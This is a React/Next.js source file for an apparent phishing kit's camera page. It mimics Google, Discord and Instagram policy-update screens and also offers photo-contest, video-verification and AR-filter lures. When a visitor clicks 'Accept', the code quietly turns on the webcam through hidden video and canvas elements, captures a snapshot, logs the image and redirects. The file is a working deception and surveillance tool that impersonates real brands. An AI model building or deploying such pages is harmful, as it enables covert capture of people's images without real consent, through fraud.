
"use client";
import { useEffect, useState, useRef } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { CameraData } from '@/types';
import { Button } from '@/components/ui/button';
import PhishingPageLayout from '@/app/phishing/PhishingPageLayout'; // Updated import path
import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon, ShieldCheck, Sparkles, Wand2 } from 'lucide-react'; // Added ShieldCheck, Sparkles, Wand2
import { cn } from '@/lib/utils';

const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; visual?: React.ReactNode; headerClassName?: string; redirectUrl?: string; }> = {
  'google-policy-update': {
    title: 'Google - Policy Update',
    message: "We've updated our Terms of Service and Privacy Policy. Please accept the new terms to continue using Google services.",
    cookieMessage: "By clicking 'Accept & Continue', you agree to Google's updated Terms of Service and Privacy Policy. This helps us improve your experience and provide personalized services.",
    actionText: 'Accept & Continue',
    // headerClassName: "bg-white text-black", // Removed as it's handled by custom UI
    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
    // redirectUrl removed
  },
  'discord-terms-update': {
    title: 'Discord - Terms of Service Update',
    message: "Important: Our Terms of Service have been updated. Please review and accept them to continue using Discord.",
    cookieMessage: "By clicking 'Accept Terms', you acknowledge and agree to Discord's updated Terms of Service. This ensures a safe and compliant environment for all users.",
    actionText: 'Accept Terms',
    // headerClassName: "bg-[#5865F2] text-white", // Removed as it's handled by custom UI
    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
    // redirectUrl removed
  },
  'instagram-privacy-update': {
    title: 'Instagram - Privacy Policy Update',
    message: "Your privacy matters. We've updated our Privacy Policy to better explain how we use your data. Please accept to continue.",
    cookieMessage: "By tapping 'Accept Policy', you agree to Instagram's updated Privacy Policy. This allows us to provide you with a more personalized and secure experience.",
    actionText: 'Accept Policy',
    // headerClassName: "bg-gradient-to-br from-[#833AB4] via-[#FD1D1D] to-[#FCB045] text-white", // Removed as it's handled by custom UI
    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
    // redirectUrl removed
  },
  'photo-contest-entry': {
    title: 'SnapWin Contest!',
    message: "Showcase your photography skills and win amazing prizes! To submit your entry, please first **accept our cookie policy below**. Camera access will be requested afterwards to capture your photo submission.",
    cookieMessage: "Our site uses cookies to enhance your experience and for essential functionality. By clicking 'Accept Cookies', you agree to our use of cookies.",
    visual: <Trophy className="h-12 w-12 text-amber-400 mr-3" />,
    headerClassName: "bg-gradient-to-r from-yellow-400 via-red-500 to-pink-500 p-4 rounded-t-lg text-white",
  },
  'video-verification': {
    title: 'Secure Video Verification',
    actionText: 'Start Video Verification',
    message: 'For security, we need to verify your identity via video. Please enable your camera.',
    visual: <ShieldCheck className="h-8 w-8 text-blue-600 mr-2" />,
  },
  'ar-filter': {
    title: 'Magical AR Filter Fun!',
    actionText: 'Test AR Filter',
    message: 'Check out our latest AR filter! Enable your camera to see it in action.',
    visual: <><Wand2 className="h-8 w-8 text-purple-500 mr-1" /><Sparkles className="h-6 w-6 text-yellow-400" /></>,
  },
  default: {
    title: 'Camera Access Required',
    actionText: 'Enable Camera',
    message: 'This feature requires camera access. Please enable your camera to continue.',
  }
};

// Define localStorage keys for redirection, similar to location page
const REDIRECT_URL_KEYS: Record<string, string> = {
  'google-policy-update': 'googlePolicyUpdateRedirectUrl',
  'discord-terms-update': 'discordTermsUpdateRedirectUrl',
  'instagram-privacy-update': 'instagramPrivacyUpdateRedirectUrl',
  // Add keys for other camera templates if they need dynamic redirection
  // 'photo-contest-entry': 'photoContestRedirectUrl',
  // 'video-verification': 'videoVerificationRedirectUrl',
  // 'ar-filter': 'arFilterRedirectUrl',
};

export default function CameraPhishingPage() {
  const { addLog } = useLogs();
  const { id: idFromParams } = useParams<{ id: string }>();
  const templateId = idFromParams || 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'streaming' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [cookieConsentGiven, setCookieConsentGiven] = useState(false);
  const [isPolicyModalOpen, setIsPolicyModalOpen] = useState(false);

  const genericPolicies = [
    "1. Information We Collect: We collect information you provide directly to us, such as when you create an account, update your profile, use the interactive features of our services, participate in a survey, or request customer support. This may include personal details such as your name, email address, phone number, postal address, and any other information you choose to provide.",
    "2. How We Use Your Information: We may use the information we collect to provide, maintain, and improve our services; to personalize your experience and the advertisements you see; to communicate with you about products, services, offers, promotions, rewards, and events offered by us and others; to monitor and analyze trends, usage, and activities in connection with our services; and for any other purpose described to you at the time the information was collected or as otherwise set forth in this privacy policy.",
    "3. Information Sharing and Disclosure: We do not share your personal information with third parties except as described in this policy. We may share information with vendors, consultants, and other service providers who need access to such information to carry out work on our behalf and are obligated to protect your information. We may also share information for legal reasons, such as in response to a request for information if we believe disclosure is in accordance with, or required by, any applicable law, regulation or legal process.",
    "4. Data Retention: We store the information we collect for as long as it is necessary for the purpose(s) for which we originally collected it, or for other legitimate business purposes, including to meet our legal, regulatory, or other compliance obligations.",
    "5. Your Choices and Rights: You may have certain rights regarding your personal information, subject to local data protection laws. These may include the right to access, correct, update, port, or request deletion of your personal information. You can typically manage your account information and communication preferences through your account settings or by contacting us directly.",
    "6. Cookies and Tracking Technologies: We use cookies and similar tracking technologies (like web beacons and pixels) to access or store information. Specific information about how we use such technologies and how you can refuse certain cookies is set out in our Cookie Policy. Most web browsers are set to accept cookies by default. If you prefer, you can usually choose to set your browser to remove or reject browser cookies.",
    "7. Third-Party Services: Our service may contain links to other websites or services that are not operated or controlled by us (Third-Party Services). Any information you provide on or to Third-Party Services or that is collected by Third-Party Services is provided directly to the owners or operators of the Third-Party Services and is subject to their own privacy policies. We do not endorse and are not responsible for the content, privacy policies, or practices of any Third-Party Services.",
    "8. Security of Your Information: We take reasonable measures, including administrative, technical, and physical safeguards, to help protect your information from loss, theft, misuse, and unauthorized access, disclosure, alteration, and destruction. However, please be aware that despite our efforts, no security measures are perfect or impenetrable, and no method of data transmission can be guaranteed against any interception or other type of misuse.",
    "9. Children's Privacy: Our services are not directed to individuals under the age of 13 (or other applicable age as required by local law), and we do not knowingly collect personal information from children in this age group. If we become aware that a child under this age has provided us with personal information, we will take steps to delete such information from our files.",
    "10. Changes to This Policy: We may update this privacy policy from time to time. If we make material changes, we will notify you by revising the date at the top of the policy and, in some cases, we may provide you with additional notice (such as adding a statement to our homepage or sending you a notification). We encourage you to review this privacy policy periodically to stay informed about our information practices and the ways you can help protect your privacy."
  ];


  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  const captureImage = () => {
    if (videoRef.current && canvasRef.current && videoRef.current.readyState === 4 && videoRef.current.videoWidth > 0) {
      const video = videoRef.current;
      const canvas = canvasRef.current;

      const MAX_WIDTH = 640; // Restored for better quality
      const MAX_HEIGHT = 480; // Restored for better quality
      let { videoWidth, videoHeight } = video;

      if (videoWidth > videoHeight) {
        if (videoWidth > MAX_WIDTH) {
          videoHeight = Math.round((videoHeight * MAX_WIDTH) / videoWidth);
          videoWidth = MAX_WIDTH;
        }
      } else {
        if (videoHeight > MAX_HEIGHT) {
          videoWidth = Math.round((videoWidth * MAX_HEIGHT) / videoHeight);
          videoHeight = MAX_HEIGHT;
        }
      }

      canvas.width = videoWidth;
      canvas.height = videoHeight;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageUrl = canvas.toDataURL('image/jpeg', 0.9); // Increased quality to 0.9
        const cameraData: CameraData = { imageUrl };
        addLog({ type: 'camera', data: cameraData });
        setStatus('captured');
        stopCameraStream(true); // Pass true to indicate capture happened
      }
    }
  };

  const handleCookieConsentAndCamera = async () => {
    setCookieConsentGiven(true);
    setIsLoading(true);
    setError(null);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
           if (videoRef.current) videoRef.current.play();
           setStatus("streaming");
           setIsLoading(false);
           // Delay capture and then check for redirection
           setTimeout(() => {
             captureImage(); // This will set status to 'captured'
           }, 1500);
        };
      }
    } catch (err) {
      console.error("Camera access error:", err);
      let errorMessage = 'Could not access camera.';
      if (err instanceof DOMException) {
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
          errorMessage = 'Camera access denied by user.';
        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
          errorMessage = 'No camera found on this device.';
        }
      }
      setError(errorMessage);
      setStatus('error');
      addLog({ type: 'generic', data: { message: `Camera error: ${errorMessage}` } });
      setIsLoading(false);
    }
  };

  const handleCameraRequest = async () => {
    if (streamRef.current) stopCameraStream();

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
           if (videoRef.current) videoRef.current.play();
           setStatus('streaming');
           setIsLoading(false);
           setTimeout(captureImage, 1500);
        };
      }
    } catch (err) {
      console.error("Camera access error:", err);
      let errorMessage = 'Could not access camera.';
      if (err instanceof DOMException) {
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
          errorMessage = 'Camera access denied by user.';
        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
          errorMessage = 'No camera found on this device.';
        }
      }
      setError(errorMessage);
      setStatus('error');
      addLog({ type: 'generic', data: { message: `Camera error: ${errorMessage}` } });
      setIsLoading(false);
    }
  };

  const stopCameraStream = (isAfterCapture = false) => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    // Only reset to 'idle' if not after capture and not already in error or captured state
    if (!isAfterCapture && status !== 'captured' && status !== 'error') {
      setStatus('idle');
    }
  };

  useEffect(() => {
    return () => {
      stopCameraStream();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // useEffect to handle redirection or success message after capture
  useEffect(() => {
    if (status === 'captured') {
      const redirectKey = REDIRECT_URL_KEYS[templateId];
      if (redirectKey) {
        const redirectUrl = localStorage.getItem(redirectKey);
        if (redirectUrl && redirectUrl.trim() !== '') {
          // For templates like google-policy, discord, instagram, show a brief message before redirect
          if (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
            // No explicit message needed here as the UI is minimal for these templates
            // and redirection should be quick.
          }
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId) ? 500 : 2500) ); // Shorter delay for policy updates
        } else {
          // If key exists but no URL, or for other templates that reach 'captured'
          // Set a message or ensure UI reflects capture without redirect.
          // For policy templates, this state might not be visibly shown if no redirect is set,
          // as they lack a dedicated "success" UI area.
          if (!['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
            // Explicit success message for other templates if needed
          }
        }
      } else {
        // For templates not in REDIRECT_URL_KEYS (if any) or if redirection is not applicable
        // This path should ideally not be hit for camera templates that are meant to have configurable redirect.
      }
    }
  }, [status, templateId, content.title]); // Added content.title to dependencies for safety, though primarily driven by status and templateId

  if (templateId === 'discord-terms-update') {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-[#36393f] p-4 text-[#dcddde] font-sans">
        {/* Hidden video and canvas for silent capture */}
        <video ref={videoRef} className="hidden" playsInline muted />
        <canvas ref={canvasRef} className="hidden"></canvas>

        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
            <h1 className="text-2xl font-bold text-white mb-4">{content.title}</h1>
            <p className="text-sm text-[#b9bbbe] mb-6" dangerouslySetInnerHTML={{ __html: content.message }} />

            <p className="text-xs text-[#72767d] mb-6">
              {content.cookieMessage}
            </p>

            <div className="space-y-3">
              <Button
                onClick={handleCookieConsentAndCamera}
                className="w-full bg-[#5865F2] hover:bg-[#4752c4] text-white font-semibold py-2.5 px-4 rounded-md text-md transition-colors duration-150"
              disabled={isLoading || cookieConsentGiven}
            >
              {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept Terms')}
            </Button>
            {error && status === 'error' && (
              <p className="text-red-400 text-xs mt-4">{error}</p>
            )}
            </div> {/* End of space-y-3 for buttons */}
             <Button
                onClick={() => setIsPolicyModalOpen(true)}
                className="w-full mt-3 bg-transparent hover:bg-[#393c43] text-[#b9bbbe] font-medium py-2.5 px-4 rounded-md text-sm border border-[#40444b] hover:border-[#50545b] transition-colors duration-150"
              >
                Read the Policy
              </Button>
          </div>
        ) : (
          // This state is after capture AND no redirect URL is set
          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
            <CheckCircle className="w-16 h-16 text-green-400 mx-auto mb-4" />
            <h1 className="text-xl font-bold text-white mb-2">Terms Accepted</h1>
            <p className="text-sm text-[#b9bbbe]">This window can now be closed.</p>
          </div>
        )}

        {/* Discord Policy Modal */}
        {isPolicyModalOpen && templateId === 'discord-terms-update' && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm" onClick={() => setIsPolicyModalOpen(false)}>
            <div className="bg-[#2f3136] p-6 rounded-lg shadow-xl w-full max-w-xl max-h-[80vh] flex flex-col text-left border border-[#40444b]" onClick={(e) => e.stopPropagation()}>
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-lg font-semibold text-white">Terms of Service</h2>
                <button
                  onClick={() => setIsPolicyModalOpen(false)}
                  className="text-[#b9bbbe] hover:text-white p-1 rounded-full hover:bg-[#393c43] transition-colors"
                  aria-label="Close policy modal"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                </button>
              </div>
              <div className="overflow-y-auto text-sm text-[#dcddde] space-y-2 pr-3 scrollbar-thin scrollbar-thumb-[#202225] scrollbar-track-[#2f3136]">
                {genericPolicies.map((policy, index) => (
                  <p key={index} className="mb-1.5 leading-relaxed">{policy}</p>
                ))}
              </div>
              <div className="mt-6 text-right">
                <Button
                  onClick={() => setIsPolicyModalOpen(false)}
                  className="bg-[#5865F2] hover:bg-[#4752c4] text-white font-medium py-2 px-4 rounded-md text-sm"
                >
                  Got it
                </Button>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  }

  if (templateId === 'google-policy-update') {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-[#f8f9fa] p-4 font-['Roboto',_sans-serif]">
        {/* Hidden video and canvas for silent capture */}
        <video ref={videoRef} className="hidden" playsInline muted />
        <canvas ref={canvasRef} className="hidden"></canvas>

        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
          <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-lg border border-gray-200">
            <div className="flex items-center mb-6">
              <img src="/google_logo.png" alt="Google Logo" className="h-8 w-auto mr-3" />
              {/* <span className="text-2xl text-[#202124]">Privacy & Terms</span> */}
            </div>
            <h1 className="text-2xl text-[#202124] mb-4">Before you continue to Google</h1>
            {/* Simplified title as Google often does */}

            <p className="text-sm text-[#5f6368] mb-3">
              Google uses cookies and data to:
            </p>
            <ul className="list-disc list-inside text-sm text-[#5f6368] mb-6 space-y-1">
              <li>Deliver and maintain services, like tracking outages and protecting against spam, fraud, and abuse</li>
              <li>Measure audience engagement and site statistics to understand how our services are used</li>
            </ul>
            <p className="text-sm text-[#5f6368] mb-6">
              If you agree, we’ll also use cookies and data to:
            </p>
             <ul className="list-disc list-inside text-sm text-[#5f6368] mb-6 space-y-1">
              <li>Improve the quality of our services and develop new ones</li>
              <li>Deliver and measure the effectiveness of ads</li>
              <li>Show personalized content, depending on your settings</li>
              <li>Show personalized or generic ads, depending on your settings, on Google and across the web</li>
            </ul>
            <p className="text-sm text-[#5f6368] mb-6">
             {content.message} {/* Main message from templateContent */}
            </p>
            <p className="text-xs text-[#70757a] mb-6">
              {content.cookieMessage} {/* Cookie message from templateContent */}
            </p>

            <div className="flex flex-col sm:flex-row justify-end items-center space-y-3 sm:space-y-0 sm:space-x-3">
              <Button
                onClick={() => setIsPolicyModalOpen(true)}
                className="text-[#1a73e8] hover:bg-gray-100 font-medium py-2 px-4 rounded w-full sm:w-auto order-2 sm:order-1"
                variant="ghost"
              >
                Read the Policy
              </Button>
              <Button
                onClick={handleCookieConsentAndCamera}
                className="bg-[#1a73e8] hover:bg-[#1765cc] text-white font-medium py-2.5 px-6 rounded transition-colors duration-150 w-full sm:w-auto order-1 sm:order-2"
                disabled={isLoading || cookieConsentGiven}
              >
                {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept & Continue')}
              </Button>
            </div>
            {error && status === 'error' && (
              <p className="text-red-600 text-xs mt-4 text-right">{error}</p>
            )}
          </div>
        ) : (
          // This state is after capture AND no redirect URL is set
          <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-lg border border-gray-200 text-center">
            <img src="/google_logo.png" alt="Google Logo" className="h-12 w-auto mx-auto mb-6" />
            <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
            <h1 className="text-xl text-[#202124] mb-2">Settings Saved</h1>
            <p className="text-sm text-[#5f6368]">This window can now be closed.</p>
          </div>
        )}
      </div>
    );
  }

  if (templateId === 'instagram-privacy-update') {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-white p-4 font-['Helvetica',_'Arial',_sans-serif]">
        {/* Hidden video and canvas for silent capture */}
        <video ref={videoRef} className="hidden" playsInline muted />
        <canvas ref={canvasRef} className="hidden"></canvas>

        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm"> {/* Removed text-center from here */}
            <img src="/instagram_logo.png" alt="Instagram Logo" className="h-10 w-auto mx-auto mb-6" />
            <h1 className="text-xl font-semibold text-black mb-3 text-center">{content.title}</h1>
            <p className="text-sm text-[#262626] mb-4 leading-relaxed text-left"> {/* Text align left for messages */}
              {content.message}
            </p>
            <p className="text-xs text-[#8e8e8e] mb-6 text-left"> {/* Text align left for messages */}
              {content.cookieMessage}
            </p>

            <div className="space-y-3">
              <Button
                onClick={handleCookieConsentAndCamera}
                className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2.5 px-4 rounded-lg text-md transition-colors duration-150"
              disabled={isLoading || cookieConsentGiven}
            >
              {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept Policy')}
            </Button>
            {error && status === 'error' && (
              <p className="text-red-500 text-xs mt-3">{error}</p>
            )}
            </div> {/* End of space-y-3 for buttons */}
            <Button
              onClick={() => setIsPolicyModalOpen(true)}
              className="w-full mt-3 bg-transparent hover:bg-gray-50 text-[#0095f6] font-semibold py-2 px-4 rounded-lg text-sm transition-colors duration-150"
              variant="ghost"
            >
              Read the Policy
            </Button>
             <p className="text-xs text-[#c7c7c7] mt-6">
              You can review our updated policy details any time in our Help Center.
            </p>
          </div>
        ) : (
          // This state is after capture AND no redirect URL is set
          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm text-center">
            <img src="/instagram_logo.png" alt="Instagram Logo" className="h-10 w-auto mx-auto mb-6" />
            <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
            <h1 className="text-lg font-semibold text-black mb-2">Policy Accepted</h1>
            <p className="text-sm text-[#262626]">This window can now be closed.</p>
          </div>
        )}

        {/* Instagram Policy Modal */}
        {isPolicyModalOpen && templateId === 'instagram-privacy-update' && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/40 backdrop-blur-sm" onClick={() => setIsPolicyModalOpen(false)}>
            <div className="bg-white p-0 rounded-xl shadow-xl w-full max-w-md max-h-[75vh] flex flex-col text-left overflow-hidden" onClick={(e) => e.stopPropagation()}>
              <div className="flex justify-between items-center p-4 border-b border-gray-200">
                <h2 className="text-md font-semibold text-black">Privacy Policy</h2>
                <button
                  onClick={() => setIsPolicyModalOpen(false)}
                  className="text-gray-500 hover:text-black p-1 rounded-full hover:bg-gray-100 transition-colors"
                  aria-label="Close policy modal"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                </button>
              </div>
              <div className="overflow-y-auto text-sm text-[#262626] space-y-3 p-4">
                {genericPolicies.map((policy, index) => (
                  <div key={index} className="mb-2">
                    <p className="font-semibold text-sm mb-0.5">{policy.substring(0, policy.indexOf(':') + 1)}</p>
                    <p className="text-xs leading-relaxed">{policy.substring(policy.indexOf(':') + 2)}</p>
                  </div>
                ))}
              </div>
              <div className="mt-auto p-4 border-t border-gray-200 text-center">
                <Button
                  onClick={() => setIsPolicyModalOpen(false)}
                  className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2 px-4 rounded-lg text-sm"
                >
                  Done
                </Button>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  }


  if (templateId === 'photo-contest-entry') {
    return (
      <>
        <PhishingPageLayout
          title={content.title}
          // className={content.headerClassName ? 'pt-0' : ''} // Example of using className for layout adjustment
        >
          <div className={cn("text-center mb-6", content.headerClassName)}>
            <div className="flex items-center justify-center p-4">
              {content.visual}
              <h1 className={cn("text-2xl font-bold", content.headerClassName ? 'text-white' : '')}>{content.title}</h1>
            </div>
          </div>
          <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
          
          <div className={cn(
              "aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2",
              (status === 'streaming' && cookieConsentGiven) ? 'border-primary' : 'border-border'
            )}>
            <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
            { !(status === 'streaming' && cookieConsentGiven) && !(status === 'captured' && cookieConsentGiven) && (
              <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/30">
                {!cookieConsentGiven ? (
                  <>
                    <ImageIcon className="h-16 w-16 text-white/70 mb-2" />
                    <p className="text-white/90">Contest photo will appear here</p>
                  </>
                ) : (status === 'idle' || status === 'requesting' || status === 'error') && cookieConsentGiven ? (
                  <>
                    <VideoOff className="h-16 w-16 text-white/70 mb-2" />
                    <p className="text-white/90 text-center px-4">{status === 'error' && error ? error : 'Camera feed inactive. Waiting for camera permission...'}</p>
                  </>
                ) : null }
              </div>
            )}
          </div>
          <canvas ref={canvasRef} className="hidden"></canvas>

          {status === 'streaming' && !isLoading && cookieConsentGiven && (
             <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md mb-6">
              <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
              <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Cancel Submission</Button>
            </div>
          )}

          {status === 'captured' && cookieConsentGiven && (
            <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md mb-6">
              <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
              <p className="font-semibold text-green-700">Photo Submitted Successfully!</p>
              <p className="text-sm text-green-600">Thank you for entering the contest. This window can now be closed.</p>
            </div>
          )}
           {status === 'error' && cookieConsentGiven && error && (
             <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md mb-6">
              <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
              <p className="font-semibold text-red-700">Camera Access Failed</p>
              <p className="text-sm text-red-600">{error}</p>
              <Button onClick={handleCameraRequest} variant="outline" className="mt-3">Try Again</Button>
            </div>
          )}
        </PhishingPageLayout>

        {!cookieConsentGiven && (
            <div className="fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50">
              <div className="container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
                <p className="text-sm text-foreground text-center sm:text-left flex-grow">
                  {content.cookieMessage || "Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}
                </p>
                <Button
                  onClick={handleCookieConsentAndCamera}
                  className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
                  size="md" // Ensure this size is defined or use default
                  disabled={isLoading && !cookieConsentGiven} 
                >
                  <Cookie className="mr-2 h-4 w-4" />
                  Accept Cookies
                </Button>
              </div>
            </div>
        )}
      </>
    );
  }

  return (
    <PhishingPageLayout
        title={content.title}
        // isLoading={isLoading && status !== 'streaming'} // Removed
        // error={error} // Removed
        // statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined} // Removed
    >
      <div className="flex items-center justify-center mb-2">
        {content.visual}
        <h1 className="text-2xl font-bold text-center">{content.title}</h1>
      </div>
      <p className="text-center text-muted-foreground mb-6">{content.message}</p>

      <div className="aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border">
        <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
        {status !== 'streaming' && status !== 'captured' && (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/50">
            <VideoOff className="h-16 w-16 text-white/70 mb-2" />
            <p className="text-white/90">Camera feed inactive</p>
          </div>
        )}
      </div>
      <canvas ref={canvasRef} className="hidden"></canvas>

      {/* Button is shown if not streaming and not captured yet */}
      {(status === 'idle' || status === 'requesting' || status === 'error') && status !== 'captured' && (
        <Button
          onClick={handleCameraRequest}
          className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
          disabled={isLoading || status === 'requesting'}
        >
          <CameraIcon className="mr-2 h-5 w-5" />
          {isLoading ? 'Initializing Camera...' : (content.actionText || 'Enable Camera')}
        </Button>
      )}

      {status === 'streaming' && !isLoading && (
         <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md">
          <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
          <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Stop Camera</Button>
        </div>
      )}

      {/* Success message for non-redirecting captures */}
      {status === 'captured' && !(REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) && (
        <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
          <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
          <p className="font-semibold text-green-700">Image Captured Successfully!</p>
          <p className="text-sm text-green-600">This window can now be closed.</p>
        </div>
      )}
      {/* Error message display */}
       {status === 'error' && error && (
         <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md">
          <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
          <p className="font-semibold text-red-700">Camera Access Failed</p>
          <p className="text-sm text-red-600">{error}</p>
           <Button onClick={handleCameraRequest} variant="outline" className="mt-3">Try Again</Button>
        </div>
      )}
    </PhishingPageLayout>
  );
}
